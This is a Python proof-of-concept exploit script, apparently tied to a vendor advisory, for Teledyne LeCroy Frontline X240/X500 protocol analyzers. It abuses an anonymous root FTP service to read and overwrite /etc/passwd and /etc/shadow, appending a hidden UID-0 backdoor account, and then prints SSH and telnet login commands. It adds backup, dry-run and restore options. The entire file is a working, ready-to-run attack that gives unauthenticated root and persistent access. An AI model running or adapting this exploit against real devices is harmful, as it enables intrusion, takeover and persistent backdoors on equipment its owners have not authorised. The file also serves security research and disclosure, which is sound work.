#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_ftp_adduser.py: Unauthenticated root via anonymous FTP.

The Frontline X240 ships BusyBox ftpd on TCP/21, running as UID 0 and accepting anonymous logins. Anonymous STOR therefore gives arbitrary file write as root. This appends a parallel UID-0 account to /etc/passwd and /etc/shadow (the existing root entry is left untouched), after which the operator can log in over SSH or telnet.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Anonymous FTP arbitrary file write as root
Advisory: TDY-PSG-2026-001 (CVE pending)
Patched : WPS 4.70 Beta / device firmware update
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_ftp_adduser.py                     # random password, prompts before write
    python x240_ftp_adduser.py --password 'Lab!23'
    python x240_ftp_adduser.py --hash '$6$salt$...'
    python x240_ftp_adduser.py --dry-run           # preview, upload nothing

Options:
    --host        target IP (default 10.10.0.240)
    --user        new username (default 'support')
    --password    plaintext password (hashed with sha512crypt)
    --hash        pre-computed $6$ shadow hash (skips --password)
    --uid --gid   default 0/0 (root-equivalent)
    --home        default /tmp
    --shell       default /bin/sh
    --dry-run     show changes without uploading
    --skip-test   skip the /tmp write sanity check
    --yes         skip the confirmation prompt
    --restore     restore both files from a backup directory created by this tool

"""

import argparse
import datetime
import ftplib
import io
import os
import re
import secrets
import string
import sys
from pathlib import Path


def gen_password(length: int = 20) -> str:
    alphabet = string.ascii_letters + string.digits + "!@#%^-_=+"
    return "".join(secrets.choice(alphabet) for _ in range(length))


def gen_sha512_crypt(password: str) -> str:
    try:
        from passlib.hash import sha512_crypt
        return sha512_crypt.using(rounds=5000).hash(password)
    except ImportError:
        pass
    try:
        import crypt  # Unix-only
        return crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
    except (ImportError, AttributeError):
        pass
    print("ERROR: hashing needs passlib on this platform.", file=sys.stderr)
    print("  pip install passlib", file=sys.stderr)
    print("  or pass --hash:  openssl passwd -6 -salt Salt Password", file=sys.stderr)
    sys.exit(2)


def ftp_get(ftp, path: str) -> bytes:
    buf = io.BytesIO()
    ftp.retrbinary(f"RETR {path}", buf.write)
    return buf.getvalue()


def ftp_put(ftp, path: str, data: bytes):
    ftp.storbinary(f"STOR {path}", io.BytesIO(data))


def secure_write(path: Path, data: bytes):
    path.write_bytes(data)
    os.chmod(path, 0o600)


def validate_field(name: str, value: str):
    if not value or any(c in value for c in (":", "\n", "\r", "\x00")):
        raise ValueError(f"{name} contains an invalid passwd/shadow character")


def restore_files(ftp, passwd: bytes, shadow: bytes) -> bool:
    """Best-effort restore of both files, followed by byte-exact verification."""
    ok = True
    for remote, original in (("/etc/passwd", passwd), ("/etc/shadow", shadow)):
        try:
            ftp_put(ftp, remote, original)
        except Exception as e:
            ok = False
            print(f"    [!] restore upload failed for {remote}: {e}", file=sys.stderr)
    for remote, original in (("/etc/passwd", passwd), ("/etc/shadow", shadow)):
        try:
            if ftp_get(ftp, remote) != original:
                ok = False
                print(f"    [!] restore verification mismatch for {remote}", file=sys.stderr)
        except Exception as e:
            ok = False
            print(f"    [!] restore verification failed for {remote}: {e}", file=sys.stderr)
    return ok


def restore_with_reconnect(host: str, passwd: bytes, shadow: bytes, ftp=None) -> bool:
    """Restore on the current session, retrying once on a fresh FTP connection."""
    if ftp is not None and restore_files(ftp, passwd, shadow):
        return True
    print("    [!] retrying restoration on a fresh FTP connection ...", file=sys.stderr)
    retry = None
    try:
        retry = ftplib.FTP(host, timeout=30)
        retry.login("anonymous", "anonymous@")
        retry.sendcmd("TYPE I")
        return restore_files(retry, passwd, shadow)
    except Exception as e:
        print(f"    [!] could not reconnect for restoration: {e}", file=sys.stderr)
        return False
    finally:
        if retry is not None:
            try:
                retry.quit()
            except Exception:
                retry.close()


def main():
    ap = argparse.ArgumentParser(description="Add a UID-0 account via anonymous-FTP rewrite of passwd/shadow")
    ap.add_argument("--host", default="10.10.0.240")
    ap.add_argument("--user", default="support")
    ap.add_argument("--password", help="Plaintext password (hashed here). Random if omitted.")
    ap.add_argument("--hash", help="Pre-computed $6$ shadow hash (skips --password)")
    ap.add_argument("--uid", default="0")
    ap.add_argument("--gid", default="0")
    ap.add_argument("--home", default="/tmp")
    ap.add_argument("--shell", default="/bin/sh")
    ap.add_argument("--gecos", default="X240 Lab Access")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--skip-test", action="store_true")
    ap.add_argument("--yes", action="store_true", help="Skip the confirmation prompt")
    ap.add_argument("--restore", metavar="BACKUP_DIR",
                    help="Restore passwd and shadow from a backup created by this tool")
    args = ap.parse_args()

    try:
        validate_field("username", args.user)
        validate_field("GECOS", args.gecos)
        validate_field("home", args.home)
        validate_field("shell", args.shell)
        if not re.fullmatch(r"\d+", args.uid) or not re.fullmatch(r"\d+", args.gid):
            raise ValueError("UID and GID must be decimal integers")
        if args.hash and (not args.hash.startswith("$6$") or any(c in args.hash for c in ":\r\n\x00")):
            raise ValueError("--hash must be a valid-looking $6$ sha512crypt field")
    except ValueError as e:
        ap.error(str(e))

    if args.restore:
        backup_dir = Path(args.restore)
        try:
            passwd = (backup_dir / "passwd").read_bytes()
            shadow = (backup_dir / "shadow").read_bytes()
        except OSError as e:
            ap.error(f"cannot read backup: {e}")
        print(f"[+] Ready to restore /etc/passwd and /etc/shadow on {args.host} from {backup_dir}")
        if not args.yes and input("    Proceed? [y/N] ").strip().lower() != "y":
            print("    Aborted.")
            return
        ftp = ftplib.FTP(args.host, timeout=30)
        try:
            ftp.login("anonymous", "anonymous@")
            ftp.sendcmd("TYPE I")
            if not restore_with_reconnect(args.host, passwd, shadow, ftp):
                print("[!] Restoration was incomplete; retain the backup and recover manually.", file=sys.stderr)
                sys.exit(1)
            print("[+] Both files restored and verified byte-for-byte.")
        finally:
            try:
                ftp.quit()
            except Exception:
                ftp.close()
        return

    generated_password = None
    if args.hash:
        pw_hash = args.hash
    else:
        password = args.password or (generated_password := gen_password())
        pw_hash = gen_sha512_crypt(password)

    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_dir = Path(f"x240_etc_backup_{stamp}_{secrets.token_hex(3)}")
    backup_dir.mkdir(mode=0o700)
    os.chmod(backup_dir, 0o700)
    print(f"[+] Backup dir: {backup_dir}/")

    print(f"[+] Connecting to {args.host}")
    ftp = ftplib.FTP(args.host, timeout=30)
    ftp.login("anonymous", "anonymous@")
    ftp.sendcmd("TYPE I")
    print(f"    Banner: {ftp.welcome.strip()}")

    if not args.skip_test:
        print("\n[1] Sanity test: write+read+delete in /tmp")
        test_path = f"/tmp/x240_writetest_{stamp}.txt"
        marker = f"x240 ftp writetest {stamp}\n".encode()
        try:
            ftp_put(ftp, test_path, marker)
            got = ftp_get(ftp, test_path)
            if got != marker:
                print(f"    [!] read-back mismatch: got {got!r} want {marker!r}")
                sys.exit(1)
            print(f"    OK ({len(marker)} bytes round-tripped exactly)")
            try:
                ftp.delete(test_path)
            except ftplib.all_errors:
                pass
        except ftplib.all_errors as e:
            print(f"    [!] sanity test failed: {e}")
            sys.exit(1)

    print("\n[2] Backup /etc/passwd and /etc/shadow")
    passwd = ftp_get(ftp, "/etc/passwd")
    shadow = ftp_get(ftp, "/etc/shadow")
    secure_write(backup_dir / "passwd", passwd)
    secure_write(backup_dir / "shadow", shadow)
    print(f"    passwd: {len(passwd)} bytes  saved to {backup_dir}/passwd")
    print(f"    shadow: {len(shadow)} bytes  saved to {backup_dir}/shadow")

    existing_users = [l.split(":", 1)[0] for l in passwd.decode("utf-8", "replace").splitlines() if l]
    if args.user in existing_users:
        print(f"    [!] user '{args.user}' already exists. Pick another name.")
        sys.exit(1)

    print("\n[3] Build new user entries (appended to the pulled files)")
    passwd_line = f"{args.user}:x:{args.uid}:{args.gid}:{args.gecos}:{args.home}:{args.shell}\n"
    shadow_line = f"{args.user}:{pw_hash}:18567:0:99999:7:::\n"
    print(f"    passwd += {passwd_line.strip()}")
    print(f"    shadow += {args.user}:{pw_hash[:16]}...:18567:0:99999:7:::")

    new_passwd = passwd.rstrip(b"\n") + b"\n" + passwd_line.encode()
    new_shadow = shadow.rstrip(b"\n") + b"\n" + shadow_line.encode()

    if args.dry_run:
        print("\n[+] DRY RUN: nothing uploaded.")
        print(f"    new /etc/passwd would be {len(new_passwd)} bytes (was {len(passwd)})")
        print(f"    new /etc/shadow would be {len(new_shadow)} bytes (was {len(shadow)})")
        if generated_password:
            print(f"    generated password would be: {generated_password}")
        return

    print(f"\n[4] About to overwrite /etc/passwd and /etc/shadow on {args.host}")
    if not args.yes:
        if input("    Proceed? [y/N] ").strip().lower() != "y":
            print("    Aborted. (Backups remain for inspection.)")
            return

    mutation_started = False
    try:
        mutation_started = True
        ftp_put(ftp, "/etc/passwd", new_passwd)
        print(f"    Uploaded /etc/passwd ({len(new_passwd)} bytes)")
        ftp_put(ftp, "/etc/shadow", new_shadow)
        print(f"    Uploaded /etc/shadow ({len(new_shadow)} bytes)")

        print("\n[5] Verify byte-exact contents")
        got_passwd = ftp_get(ftp, "/etc/passwd")
        got_shadow = ftp_get(ftp, "/etc/shadow")
        if got_passwd != new_passwd or got_shadow != new_shadow:
            raise RuntimeError("uploaded account files did not verify byte-for-byte")
        print("    /etc/passwd: exact match")
        print("    /etc/shadow: exact match")
    except Exception as e:
        print(f"    [!] account update failed: {e}", file=sys.stderr)
        if mutation_started:
            print("    [!] restoring both original files ...", file=sys.stderr)
            if restore_with_reconnect(args.host, passwd, shadow, ftp):
                print("    Originals restored and verified.", file=sys.stderr)
            else:
                print(f"    CRITICAL: automatic restoration was incomplete. Backups: {backup_dir}",
                      file=sys.stderr)
        sys.exit(1)

    print("\n[+] Done. Log in:")
    print(f"    ssh    {args.user}@{args.host} -oHostKeyAlgorithms=+ssh-rsa")
    print(f"    telnet {args.host}        # then user: {args.user}")
    if generated_password:
        print(f"    password (generated): {generated_password}")
    elif args.password:
        print(f"    password: {args.password}")

    print("\n[+] To restore, re-upload the saved backups:")
    print(f"    python {Path(__file__).name} --host {args.host} --restore {backup_dir}")

    ftp.quit()


if __name__ == "__main__":
    main()
